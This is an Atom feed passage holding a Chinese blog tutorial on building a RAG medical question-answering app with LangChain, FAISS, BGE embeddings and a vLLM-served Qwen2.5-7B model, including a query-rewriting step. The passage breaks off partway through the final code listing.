<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>逸风亭</title>
  <icon>https://blog.fyz666.xyz/images/avatar.jpg</icon>
  <subtitle>Shelter for Wind</subtitle>
  <link href="https://blog.fyz666.xyz/atom.xml" rel="self"/>
  
  <link href="https://blog.fyz666.xyz/"/>
  <updated>2025-08-14T08:53:41.569Z</updated>
  <id>https://blog.fyz666.xyz/</id>
  
  <author>
    <name>WindShadow</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>动手实现一个医学问答大模型（浅尝检索增强生成方法：RAG）</title>
    <link href="https://blog.fyz666.xyz/blog/12897/"/>
    <id>https://blog.fyz666.xyz/blog/12897/</id>
    <published>2025-08-12T13:44:10.000Z</published>
    <updated>2025-08-14T08:53:41.569Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前情提要-amp-动机"><a href="#前情提要-amp-动机" class="headerlink" title="前情提要 &amp; 动机"></a>前情提要 &amp; 动机</h2><p>前段时间忙里偷闲和女朋友一起去了趟云南（你可以查看<a href="/gallery/travel/yunnan/">相册</a>），在出发之前，由于怕女朋友高反，遂问了一圈各种AI应该带什么药、做什么准备措施，以及高反的主要症状等。在做足了功课后，职业病又犯了：我能不能自己搞个<del>大模型</del>小模型，让它具备专业的医学知识，以使得用户提问时，其能从专业的角度给予回答？</p><hr><p>说干就干，由于需要一定的实用性，就不考虑 7b 以下的模型了，但7b的模型我的垃圾显卡又训不动，怎么办呢？于是我想起了曾经听说过的一种技术：检索增强生成（Retrieval Augmented Generation, RAG），这种方法不需要训练模型，直接用预训练好的模型即可。</p><h2 id="RAG是什么？"><a href="#RAG是什么？" class="headerlink" title="RAG是什么？"></a>RAG是什么？</h2><blockquote><p>检索增强生成 (英语：Retrieval-augmented generation, RAG ) 是赋予生成式人工智能模型资讯检索能力的技术。检索增强生成最佳化大型语言模型(LLM) 的交互方式，让模型根据指定的一组文件回应使用者的查询，并使用这些资讯增强模型从自身庞大的静态训练数据中提取的资讯。<br><cite><a href="https://zh.wikipedia.org/zh-hans/%E6%AA%A2%E7%B4%A2%E5%A2%9E%E5%BC%B7%E7%94%9F%E6%88%90#:~:text=%E6%A3%80%E7%B4%A2%E5%A2%9E%E5%BC%BA%E7%94%9F%E6%88%90%EF%BC%88%E8%8B%B1%E8%AF%AD%EF%BC%9ARetrieval,%E6%95%B0%E6%8D%AE%E4%B8%AD%E6%8F%90%E5%8F%96%E7%9A%84%E4%BF%A1%E6%81%AF%E3%80%82">维基百科</a></cite></p></blockquote><p>回到我的需求：使大模型获得一定的医学知识。要使大模型具备一定的专业知识，最方便的不需要额外训练的方法当然就是直接将专业知识作为上下文喂给大模型，让它基于这些内容进行回答。但我们又知道，我们给模型提供的上下文越多，其中的关键信息越会被淡化，哪怕长度未到上限，仍可能引发回答幻觉。</p><p>为尽可能减少专业知识领域的幻觉问题，这种名为<strong>检索增强生成</strong>的方案应运而生。</p><p>简单说来，就是通过一些文本相似度算法，从非常多的专业语料数据中检索出与用户的提问相关度较高的内容，一并作为上下文喂给模型。如此，模型的上下文内容中仅仅包含了与用户提问相关度最高的信息，而非所有的专业知识，上下文与用户提问的相关性大幅提升，而其长度则大幅下降，从而使得模型能给出更专业、更可信的回答。</p><p>纸上得来终觉浅，在知道其原理后，我们来尝试一下吧！</p><h2 id="RAG方法的实践"><a href="#RAG方法的实践" class="headerlink" title="RAG方法的实践"></a>RAG方法的实践</h2><h3 id="数据集准备-amp-处理"><a href="#数据集准备-amp-处理" class="headerlink" title="数据集准备 &amp; 处理"></a>数据集准备 &amp; 处理</h3><p>我上哪去弄那么多医学相关的文本数据？逛逛开源社区肯定错不了，稍一搜索，我找到了它：<a href="https://huggingface.co/datasets/FreedomIntelligence/huatuo_encyclopedia_qa">FreedomIntelligence/huatuo_encyclopedia_qa</a>，这是一个中文医学问答数据集，共包含364420条 Q-A 对。</p><p>一般情况下，对于大段大段的长篇文本，为了制作RAG的数据库，我们还需要考虑如何将其进行切片，而这种处理好的一条一条的数据就几乎不用考虑切片问题了，特别适合作为RAG的数据。</p><hr><p>我们使用一个集成的非常好的框架：langchain来进行处理。RAG方法需要将文本数据制作成嵌入向量存储到数据库中，在检索时匹配语义相似度最高的向量（这里相似度指标可以使用欧氏距离、余弦相似度等）。总之，无论如何，我们总是需要将文本先转化为嵌入向量，因此需要一个<strong>嵌入模型</strong>，这里我使用了BAAI系列的嵌入模型：<code>BAAI/bge-large-zh-v1.5</code>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> langchain<span class="token punctuation">.</span>embeddings <span class="token keyword">import</span> HuggingFaceEmbeddingsembeddings <span class="token operator">=</span> HuggingFaceEmbeddings<span class="token punctuation">(</span>    model_name<span class="token operator">=</span><span class="token string">"BAAI/bge-large-zh-v1.5"</span><span class="token punctuation">,</span>    model_kwargs<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"device"</span><span class="token punctuation">:</span> <span class="token string">"cpu"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的设备可以改成<code>cuda</code>以提速。有了嵌入模型，接下来我们需要使用一个向量数据库，将全部文本数据转化成的嵌入向量存入。鉴于数据的规模不大，我使用了一个比较轻量的向量数据库：faiss。</p><p>langchain对这个数据库进行了比较好的封装，我们可以直接调用：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> langchain<span class="token punctuation">.</span>vectorstores <span class="token keyword">import</span> FAISS<span class="token keyword">from</span> datasets <span class="token keyword">import</span> load_dataset<span class="token keyword">from</span> langchain<span class="token punctuation">.</span>docstore<span class="token punctuation">.</span>document <span class="token keyword">import</span> Document<span class="token keyword">import</span> json<span class="token keyword">import</span> osos<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span><span class="token string">"RAG_DB"</span><span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>data <span class="token operator">=</span> load_dataset<span class="token punctuation">(</span><span class="token string">"FreedomIntelligence/huatuo_encyclopedia_qa"</span><span class="token punctuation">,</span> split<span class="token operator">=</span><span class="token string">'train'</span><span class="token punctuation">)</span>docs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> row <span class="token keyword">in</span> data<span class="token punctuation">:</span>    content <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>row<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    docs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Document<span class="token punctuation">(</span>page_content<span class="token operator">=</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>db <span class="token operator">=</span> <span class="token boolean">None</span>batchsize <span class="token operator">=</span> <span class="token number">512</span>index <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">with</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>docs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> bar<span class="token punctuation">:</span>    <span class="token keyword">while</span> index <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>docs<span class="token punctuation">)</span><span class="token punctuation">:</span>        batch <span class="token operator">=</span> docs<span class="token punctuation">[</span>index<span class="token punctuation">:</span> index <span class="token operator">+</span> batchsize<span class="token punctuation">]</span>        index <span class="token operator">+=</span> batchsize        <span class="token keyword">if</span> db <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            db <span class="token operator">=</span> FAISS<span class="token punctuation">.</span>from_documents<span class="token punctuation">(</span>batch<span class="token punctuation">,</span> embeddings<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            db<span class="token punctuation">.</span>add_documents<span class="token punctuation">(</span>batch<span class="token punctuation">)</span>        bar<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>batch<span class="token punctuation">)</span><span class="token punctuation">)</span>db<span class="token punctuation">.</span>save_local<span class="token punctuation">(</span><span class="token string">"RAG_DB/medical"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一步骤比较耗时，防止等的不耐烦，遂加了个进度条。每次往数据库中添加512条Q-A对，大约花了一个半小时才搞定。</p><p>至此，数据已经处理完成。</p><h3 id="实现文本检索"><a href="#实现文本检索" class="headerlink" title="实现文本检索"></a>实现文本检索</h3><p>既然已经制作好了数据库，这一步就很容易了，langchain同样封装好了相似度计算的部分，它默认使用的是欧氏距离作为相似度指标（距离越小，相似度越高）。我们从数据库对象中提取一个<code>retriever</code>出来，就可以直接使用了：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">retriever <span class="token operator">=</span> db<span class="token punctuation">.</span>as_retriever<span class="token punctuation">(</span>search_type<span class="token operator">=</span><span class="token string">"similarity"</span><span class="token punctuation">,</span> search_kwargs<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"k"</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>随便写个问题测试一下：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/2f507776-cfdb-4a82-96b6-a1d39f247d96.png" style="zoom:50%;" /></p><p>可以看到检索的效果还是比较好的，拿到了检索器，剩下的操作就很简单了，只要部署起一个大模型，稍微实现一下后端逻辑，再用Gradio整个界面出来，就万事大吉了！</p><h3 id="部署大模型"><a href="#部署大模型" class="headerlink" title="部署大模型"></a>部署大模型</h3><p>说是大模型，其实就是个7b的小模型罢了。这里我使用了<a href="https://huggingface.co/Qwen/Qwen2.5-7B-Instruct">Qwen/Qwen2.5-7B-Instruct</a>。</p><p>将模型下载到本地：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hf download Qwen/Qwen2.5-7B-Instruct --local-dir ./model/Qwen2.5-7B-Instruct<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过vllm启动：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> vllm.entrypoints.openai.api_server <span class="token punctuation">\</span>  <span class="token parameter variable">--model</span> ./model/Qwen2.5-7B-Instruct <span class="token punctuation">\</span>  <span class="token parameter variable">--tokenizer</span> ./model/Qwen2.5-7B-Instruct <span class="token punctuation">\</span>  <span class="token parameter variable">--dtype</span> float16 <span class="token punctuation">\</span>  <span class="token parameter variable">--host</span> <span class="token number">0.0</span>.0.0 <span class="token punctuation">\</span>  <span class="token parameter variable">--port</span> <span class="token number">8000</span> <span class="token punctuation">\</span>  --max-num-seqs <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>稍等片刻启动完成后（吃掉了约20G显存…（模型自身占用$7\times2=14$GB，KV-cache占用约6.7GB）），我们就可以直接通过OpenAI提供的api来与之交互：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openai <span class="token keyword">import</span> OpenAIclient <span class="token operator">=</span> OpenAI<span class="token punctuation">(</span>    base_url<span class="token operator">=</span><span class="token string">"http://localhost:8000/v1"</span><span class="token punctuation">,</span>    api_key<span class="token operator">=</span><span class="token string">"n"</span><span class="token punctuation">)</span>messages <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> <span class="token string">"你是谁？"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>chat<span class="token punctuation">.</span>completions<span class="token punctuation">.</span>create<span class="token punctuation">(</span>    model<span class="token operator">=</span><span class="token string">"./model/Qwen2.5-7B-Instruct"</span><span class="token punctuation">,</span>    messages<span class="token operator">=</span>messages<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="编写RAG业务逻辑"><a href="#编写RAG业务逻辑" class="headerlink" title="编写RAG业务逻辑"></a>编写RAG业务逻辑</h3><p>为得到相似度得分，排除掉特别不相关的内容，我们可以自己写一个<code>retrieve</code>函数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">retrieve</span><span class="token punctuation">(</span>question<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    docs <span class="token operator">=</span> db<span class="token punctuation">.</span>similarity_search_with_score<span class="token punctuation">(</span>question<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    docs <span class="token operator">=</span> <span class="token punctuation">[</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>doc<span class="token punctuation">.</span>page_content<span class="token punctuation">)</span> <span class="token keyword">for</span> doc<span class="token punctuation">,</span> score <span class="token keyword">in</span> docs <span class="token keyword">if</span> score<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0.9</span><span class="token punctuation">]</span>    docs <span class="token operator">=</span> <span class="token punctuation">[</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">"question"</span><span class="token punctuation">:</span> doc<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"questions"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"answer"</span><span class="token punctuation">:</span> doc<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"answers"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token keyword">for</span> doc <span class="token keyword">in</span> docs<span class="token punctuation">]</span>    <span class="token keyword">return</span> docs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给一个系统提示词：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">system_prompt <span class="token operator">=</span> <span class="token triple-quoted-string string">"""你是一位医学专家。你擅长根据文档回答用户的提问。要求：1. 只使用提供的文档内容来回答问题。2. 不要添加任何额外的内容，如果文档中没有相关信息，请直接回答"无法回答"。3. 如果没有搜到相关文档，请回答"未查询到相关文档"。"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再编写一个用户提示词模板：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> langchain<span class="token punctuation">.</span>prompts <span class="token keyword">import</span> PromptTemplateprompt_template <span class="token operator">=</span> PromptTemplate<span class="token punctuation">.</span>from_template<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""文档: &#123;context&#125;问题: &#123;question&#125;"""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来，我们通过langchain框架将RAG的流程实现一下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> langchain_core<span class="token punctuation">.</span>runnables <span class="token keyword">import</span> RunnableMap<span class="token punctuation">,</span> RunnableLambdarag_chain <span class="token operator">=</span> <span class="token punctuation">(</span>    RunnableMap<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">"history"</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"history"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"question"</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> build_context_query<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token string">"question"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token string">"history"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token operator">|</span> RunnableLambda<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">"question"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"question"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"history"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"history"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"context"</span><span class="token punctuation">:</span> retrieve<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token string">"question"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token operator">|</span> RunnableLambda<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">"question"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"question"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"history"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"history"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"context"</span><span class="token punctuation">:</span> <span class="token string">"\n"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token string">'context'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"references"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">'context'</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token operator">|</span> RunnableLambda<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">"prompt"</span><span class="token punctuation">:</span> prompt_template<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>question<span class="token operator">=</span>x<span class="token punctuation">[</span><span class="token string">"question"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> context<span class="token operator">=</span>x<span class="token punctuation">[</span><span class="token string">"context"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"history"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"history"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"references"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"references"</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token operator">|</span> RunnableLambda<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">"response"</span><span class="token punctuation">:</span> stream<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token string">"prompt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token string">"history"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"references"</span><span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"references"</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是一个串联过程，看似复杂，实则容易理解，限于篇幅，不再详细解释。</p><p>需要解释一下这里定义的一个函数：<code>build_context_query</code>，它用来处理用户输入的提问，如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">build_context_query</span><span class="token punctuation">(</span>question<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> history<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""构建包含历史上下文的查询"""</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> history<span class="token punctuation">:</span>        <span class="token keyword">return</span> question        <span class="token keyword">return</span> summarize_context_query<span class="token punctuation">(</span>question<span class="token punctuation">,</span> history<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">summarize_context_query</span><span class="token punctuation">(</span>question<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> history<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""使用大模型总结历史提问，生成更准确的检索查询"""</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> history<span class="token punctuation">:</span>        <span class="token keyword">return</span> question        <span class="token comment"># 构建历史对话列表</span>    history <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f'Q: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_msg<span class="token punctuation">&#125;</span></span><span class="token string">\nA: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span> <span class="token keyword">for</span> user_msg<span class="token punctuation">,</span> response <span class="token keyword">in</span> history<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 最近3轮</span>    system_prompt <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""你是一个重写助手，任务是将用户当前的问题结合历史对话重写为一个**自包含、清晰明确的问题句子**，以便发送给问答系统。请遵循以下规则：1. 仅重写问题，**不回答**；2. 替换句中的所有代词（如“它”、“这”、“那”等）为具体的名词或短语，当可能存在多个指代对象时，使用最新的历史对话中的信息；3. 推理指代、补全省略，使问题独立完整；4. 不引入历史中未提及的信息； 5. 只输出**重写后的问题句子**，不添加任何解释或注释。"""</span></span>        summary_prompt <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""历史对话：</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">. </span><span class="token interpolation"><span class="token punctuation">&#123;</span>q<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> i<span class="token punctuation">,</span> q <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>history<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">当前问题：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>question<span class="token punctuation">&#125;</span></span><span class="token string">你重写的问题："""</span></span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        messages <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> system_prompt<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    <span class="token punctuation">&#123;</span><span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> summary_prompt<span class="token punctuation">&#125;</span><span class="token punctuation">]</span>        response <span class="token operator">=</span> client<span class="token punctuation">.</span>chat<span class="token punctuation">.</span>completions<span class="token punctuation">.</span>create<span class="token punctuation">(</span>            model<span class="token operator">=</span><span class="token string">"./model/Qwen2.5-7B-Instruct"</span><span class="token punctuation">,</span>            messages<span class="token operator">=</span>messages<span class="token punctuation">,</span>            stream<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>            max_tokens<span class="token operator">=</span><span class="token number">50</span>        <span class="token punctuation">)</span>                summarized_query <span class="token operator">=</span> response<span class="token punctuation">.</span>choices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>message<span class="token punctuation">.</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"原始问题: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>question<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"重写问题: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>summarized_query<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> summarized_query            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> question<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一长串代码，实际仅处理了一件事：根据最近3轮的历史聊天信息，把用户的提问重新整理一下。</p><hr><p>在实际使用中，我们发现，用户和模型的对话很可能是这样的：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">user: 艾滋病是什么？assistant: 艾滋病是一种危害性极大的传染病...user: 它如何治疗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>由于RAG在检索召回相似文档时仅仅依赖于用户的提问，而不会关注上下文信息，这里RAG检索的问题：「它如何治疗？」中缺乏关键信息——这个<strong>它</strong>指什么？（即使用户认为上下文中存在这一信息），为了解决这一问题，我想了个骚操作：让大模型根据历史对话记录来对用户的提问进行重写。这就是上面代码所做的事。</p><p>亲测还是比较好用的：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/02ef0756-9573-4a09-bb47-49dd0c2a3261.png" style="zoom:75%;" /></p><p>后来发现工程上似乎就是这么做的，这个任务叫<strong>Query Rewriting（查询重写）</strong>。</p><p>需要注意的是，我仅仅在查询重写这一步骤中使用了历史信息，并没有在与大模型的对话上下文中使用它们。</p><h3 id="完整代码-amp-使用体验"><a href="#完整代码-amp-使用体验" class="headerlink" title="完整代码 &amp; 使用体验"></a>完整代码 &amp; 使用体验</h3><p>将业务逻辑用Gradio糊一个前端，再实现一下流式响应，一个简单的医学问答大模型平台就完成了！</p><p>完整代码如下：</p><p><code>RAG/medical.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> langchain<span class="token punctuation">.</span>prompts <span class="token keyword">import</span> PromptTemplate<span class="token keyword">from</span> langchain_huggingface <span class="token keyword">import</span> HuggingFaceEmbeddings<span class="token keyword">from</span> langchain_community<span class="token punctuation">.</span>vectorstores <span class="token keyword">import</span> FAISS<span class="token keyword">import</span> os<span class="token keyword">import</span> json<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdmembeddings <span class="token operator">=</span> HuggingFaceEmbeddings<span class="token punctuation">(</span>    model_name<span class="token operator">=</span><span class="token string">"BAAI/bge-large-zh-v1.5"</span><span class="token punctuation">,</span>    model_kwargs<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"device"</span><span class="token punctuation">:</span> <span class="token string">"cpu"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>db_path <span class="token operator">=</span> <span class="token string">'RAG_DB/medical'</span><span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>db_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    db <span class="token operator">=</span> FAISS<span class="token punctuation">.</span>load_local<span class="token punctuation">(</span>db_path<span class="token punctuation">,</span> embeddings<span class="token punctuation">,</span> allow_dangerous_deserialization<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token 